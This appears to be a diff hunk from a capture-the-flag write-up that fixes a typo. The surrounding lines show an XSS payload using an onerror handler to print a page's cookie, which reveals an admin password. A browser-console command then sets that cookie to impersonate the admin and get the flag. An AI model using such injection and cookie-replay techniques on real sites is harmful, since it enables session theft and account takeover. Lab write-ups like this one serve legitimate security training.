@@ -50,7 +50,7 @@ Upon entering  `' onerror='document.write(document.cookie)`, we get
   <body>passwordzzzzz=1_4m_z3_4dm1n_0f_z15_5173_pl3453_n0_h4ck_d4nk</body>
 </html>
 ```
-Now we can go into the console of chrome and type `document.cookie="passwordzzzzz=1_4m_z3_4dm1n_0f_z15_5173_pl3453_n0_h4ck_d4nk"`4
+Now we can go into the console of chrome and type `document.cookie="passwordzzzzz=1_4m_z3_4dm1n_0f_z15_5173_pl3453_n0_h4ck_d4nk"`
 
 We can now enter and pretend to be cookie monster to get the flag.
 
